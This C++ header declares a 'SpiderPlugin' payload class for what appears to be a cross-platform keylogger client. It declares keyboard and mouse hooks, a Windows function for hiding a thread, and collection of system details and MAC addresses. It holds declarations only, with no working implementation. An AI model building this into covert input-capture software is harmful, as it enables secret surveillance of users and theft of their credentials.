#pragma once

#if defined _WIN32
#include <windows.h>
#endif

#include <vector>
#include "IPayload.h"

namespace spider
{
namespace client
{
namespace library
{
class SpiderPlugin : public IPayload
{
  public:
    SpiderPlugin();
    virtual ~SpiderPlugin();

    // Should initialize the payload, if needed
    virtual bool init();

    // Should de-initialize the payload, if needed
    virtual bool deinit();

    // Retrieve system informations
    virtual SystemInfos const &getInfos() const;

    // Toggle Keyboard hook
    virtual bool getKeyboard();

    // Toggle Mouse hook
    virtual bool getMouse();

    // Execute all the actions needed
    virtual void run();

  private:
// SpiderPluginWindows.cpp
#if defined _WIN32
    bool initWindows();
    bool hideThreadWindows(void *handleThread); // Specific to Windows
    bool deinitWindows();
    void getInfosWindows();
    Architecture detectArchWindows() const;
    std::uint64_t getRAMWindows() const;
    void getMACAddress(std::vector<std::string> &addr) const;
    bool hookKeyboardWindows();
    bool unHookKeyboardWindows();
    static LRESULT CALLBACK keyboardHookWindows(int nCode, WPARAM wParam, LPARAM lParam);
    bool hookMouseWindows();
    bool unHookMouseWindows();
    static LRESULT CALLBACK mouseHookWindows(int nCode, WPARAM wParam, LPARAM lParam);
    void runWindows() const;
// SpiderPluginOSX.cpp
#elif defined __APPLE__
    bool initOSX();
    bool deinitOSX();
    std::uint64_t getRAMOSX() const;
    void getInfosOSX();
    bool hookKeyboardOSX() const;
    bool unHookKeyboardOSX() const;
    bool hookMouseOSX() const;
    bool unHookMouseOSX() const;
// SpiderPluginLinux.cpp
#elif defined __linux__
    bool initLinux();
    bool deinitLinux();
    std::uint64_t getRAMLinux() const;
    void getInfosLinux();
    bool hookKeyboardLinux() const;
    bool unHookKeyboardLinux() const;
    bool hookMouseLinux() const;
    bool unHookMouseLinux() const;
#else
#error "Plateform not supported"
#endif
#if defined __APPLE__ || defined __linux__
    std::uint32_t getPageSize() const;
    std::uint16_t getNumberProcessors() const;
#endif

    SystemInfos m_infos;
    bool m_keyboardHook;
    bool m_mouseHook;

#if defined _WIN32
    HHOOK m_keyboardHookWin;
    HHOOK m_mouseHookWin;
#endif
};
}
}
}